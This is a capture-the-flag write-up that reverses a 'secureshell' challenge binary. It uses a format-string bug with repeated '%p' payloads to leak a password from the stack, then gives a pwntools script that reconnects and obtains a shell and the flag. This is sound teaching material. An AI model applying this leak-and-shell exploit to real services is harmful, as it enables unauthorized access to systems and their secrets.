# Pwn 200 Solution

## Solution

### Reversing

Let's start by simply running the binary:
```
$ ./secureshell 
Welcome to my custom secure shell!
Could not open file: password.txt
```

Based on the error message, I could guess that it's probably looking for `password.txt`, but let's open the binary in IDA to confirm.

Let's take a look at the first part of `main`:

```
; int __cdecl main(int argc, const char **argv, const char **envp)
public main
main proc near

stream= qword ptr -618h
s= byte ptr -610h
var_510= byte ptr -510h
s2= byte ptr -410h
var_8= qword ptr -8

push    rbp
mov     rbp, rsp
sub     rsp, 620h
mov     rax, fs:28h
mov     [rbp+var_8], rax
xor     eax, eax
mov     rax, cs:__bss_start
mov     esi, 0          ; buf
mov     rdi, rax        ; stream
call    _setbuf
lea     rdi, s          ; "Welcome to my custom secure shell!"
call    _puts
lea     rax, [rbp+s]
mov     edx, 0FFh       ; n
mov     esi, 0          ; c
mov     rdi, rax        ; s
call    _memset
lea     rax, [rbp+var_510]
mov     edx, 0FFh       ; n
mov     esi, 0          ; c
mov     rdi, rax        ; s
call    _memset
lea     rax, [rbp+s2]
mov     edx, 400h       ; n
mov     esi, 0          ; c
mov     rdi, rax        ; s
call    _memset
lea     rsi, modes      ; "r"
lea     rdi, filename   ; "password.txt"
call    _fopen
mov     [rbp+stream], rax
cmp     [rbp+stream], 0
jnz     short loc_A65
```

A lot of this code can be ignored.  The important thing to notice is `fopen` is called on the filename, `password.txt`.  If `password.txt` is not found, then the following block of code gets executed:

```
lea     rsi, filename   ; "password.txt"
lea     rdi, format     ; "Could not open file: %s\n"
mov     eax, 0
call    _printf
mov     edi, 1          ; status
call    _exit
```

Since `password.txt` was not provided with this challenge, let's create our own `password.txt` file.  I will fill it in with all `A`'s.

```
$ printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' > password.txt
```

Now, let's look at what's happening when we run the binary:

```
$ ./secureshell 
Welcome to my custom secure shell!
Username: 
```

Great! The binary doesn't crash!  But what should we enter as the username?

Let's continue with reversing:

```
mov     rdx, [rbp+stream]
lea     rax, [rbp+s]
mov     rcx, rdx        ; stream
mov     edx, 0FEh       ; n
mov     esi, 1          ; size
mov     rdi, rax        ; ptr
call    _fread
lea     rdi, aUsername  ; "Username: "
mov     eax, 0
call    _printf
lea     rax, [rbp+s2]
mov     rsi, rax
lea     rdi, a1023s     ; "%1023s"
mov     eax, 0
call    ___isoc99_scanf
lea     rax, [rbp+s2]
mov     rsi, rax        ; s2
lea     rdi, s1         ; "r00t"
call    _strcmp
test    eax, eax
jz      short loc_AFD
```

We see that `scanf` is called, followed by `strcmp`, comparing against the string: `r00t`.

So let's go ahead and enter that into the binary:

```
$ ./secureshell 
Welcome to my custom secure shell!
Username: r00t
Password: 
```

Now we are prompted for a password.  Let's look at the dissassembly:

```
lea     rdi, aPassword
mov     eax, 0
call    _printf
lea     rax, [rbp+var_510]
mov     rsi, rax
lea     rdi, a254s      ; "%254s"
mov     eax, 0
call    ___isoc99_scanf
lea     rdx, [rbp+var_510]
lea     rax, [rbp+s]
mov     rsi, rdx        ; s2
mov     rdi, rax        ; s1
call    _strcmp
test    eax, eax
jz      short loc_B5C
```

So `scanf` is called again, and then another call to `strcmp`.  However, the string we are comparing against is not hardcoded.  Notice that it is comparing against `[rbp+s]`.  This variable was referenced earlier in the code when the `password.txt` file was being read.

Notice, that if the `strcmp` returns sucessfully, then the following code is executed:

```
loc_B5C:                ; "/bin/sh"
lea     rdi, command
call    _system
```

This will execute a shell for us!  Let's confirm that by trying the string we defined in our local copy of `password.txt`.

```
$ ./secureshell 
Welcome to my custom secure shell!
Username: r00t
Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
$ ls
password.txt  secureshell
```

### Vulnerability Hunting

Great, we have a shell!  However, this only works locally.  We need to know the password on the remote server.  Let's take another look at the dissassembly and try and find a vulnerability.

Here is the code that is executed when an invalid username is detected:

```
lea     rdi, aInvalidUsernam ; "Invalid Username: "
mov     eax, 0
call    _printf
lea     rax, [rbp+s2]
mov     rdi, rax        ; format
mov     eax, 0
call    _printf
mov     edi, 1          ; status
call    _exit
```

We have 2 `printf` calls followed by an `exit` call.  Notice that the `format` argument for the second `printf` call is not hardcoded.  This often times indicates a string format vulnerability.  Let's try it out and see if it works.

```
$ ./secureshell 
Welcome to my custom secure shell!
Username: %x.%x.%x.%x.
Invalid Username: ad6c5230.7b2d68c0.0.12.
```

### Exploit time!

Notice above I used the `%x` strfmt string.  This is typically useful for 32-bit binaries, but since we are working with a 64-bit binary, we will actually want to use `%p` instead.  I'm going to try the strfmt vuln again, but this time with `%p` and I am going to use a lot more.

```
$ ./secureshell 
Welcome to my custom secure shell!
Username: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
Invalid Username: 0x7fff248803c0.0x7fc8d536e8c0.(nil).0x12.(nil).0x4.0x55a9fec3f260.0x4141414141414141.0x4141414141414141.0x4141414141414141.0x4141414141414141.(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).
```

Whoah, look at that, the following values are especially interesting: `0x4141414141414141.0x4141414141414141.0x4141414141414141.0x4141414141414141`.

For those that don't have the ASCII table memorized, `0x41` decodes to `A` in ASCII.  So we are able to successfully leak the contents of `password.txt` from the stack.  However, before running this on the server, it's worth mentioning that Linux binaries typically are compiled for little-endian mode.  This means that each 64-bit value will need to reverse endian.  I will show by example.

Let's first set a new password:

```
$ printf 'ABCDEFGHIJKLMNOPQQQQQQQQQQQQQQQQ' > password.txt
```

Now let's try the same strfmt payload:

```
$ ./secureshell 
Welcome to my custom secure shell!
Username: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
Invalid Username: 0x7ffcbac7ef00.0x7f95e76348c0.(nil).0x12.(nil).0x4.0x56462564b260.0x4847464544434241.0x504f4e4d4c4b4a49.0x5151515151515151.0x5151515151515151.(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).
```

And here is our leaked password:

```
0x4847464544434241.0x504f4e4d4c4b4a49.0x5151515151515151.0x5151515151515151.
```

So to build the string from the leaked values, we start with the first leaked value: `0x4847464544434241`

We take the last 2 hex characters, `41`, decode it to ASCII, which is `A`.  Then we take the next 2 hex characters from the end, `42`, and decode that to ASCII, which is `B`.  We continue doing this for the entire leaked value, and then move onto the next leaked value.

You could certainly manually do this to leak the remote server's password, but in my opinion it would be quicker to write a Python script to automatically solve it.

I generally like to start my pwn scripts off with some boiler plate code:

```python
#!/usr/bin/env python2
from pwn import *

FNAME = './secureshell'
HOST = '127.0.0.1'
PORT = '7100'
REMOTE = True

def getp():
    if REMOTE:
        p = remote(HOST, PORT)
    else:
        p = process([FNAME])
    return p
```

And here is the code we can use to trigger the strfmt vulnerability, leaking the password:

```python
# Leak password
p = getp()
p.recvuntil('Username: ')

payload = ''
payload += '%p.'*46
p.sendline(payload)

p.recvuntil('Invalid Username: ')

ret = p.recvall()
```

Now we must parse the string, `ret` to decode the actual password.

```python
# Extract password from leaked values on the stack
addrs = ret.split('.')
addrs = addrs[7:] # skip the first 7 addresses

password = ''
for addr in addrs:
    # Check if null byte
    if 'nil' in addr:
        break
    # Remove '0x' from string
    addr = addr.replace('0x', '')
    # Decode hex -> ascii string
    password_part = addr.decode('hex')
    # now reverse the bytes
    password_part = password_part[::-1]
    password += password_part

log.info('Password: %s' % password)
```

Finally, let's reconnect to the binary/service and send the password that we previously leaked:

```python
# Now that we have the password, reconnect for the shell
p = getp()

# Username
p.recvuntil('Username: ')
p.sendline(username)

# Password
p.recvuntil('Password: ')
p.sendline(password)

p.interactive()
```

### Script Output

```
$ ./solution.py 
[+] Starting local process './secureshell': pid 8797
[*] Process './secureshell' stopped with exit code 1 (pid 8797)
[+] Receiving all data: Done (355B)
[*] Password: v3rys3curep455w0rd_827YNiwwnTxnUJM0
[+] Starting local process './secureshell': pid 8800
[*] Switching to interactive mode
$ cat flag.txt
BSidesPDX{ayy_lma0_my_5h3ll_i5_n0t_v3ry_s3cur3}
```
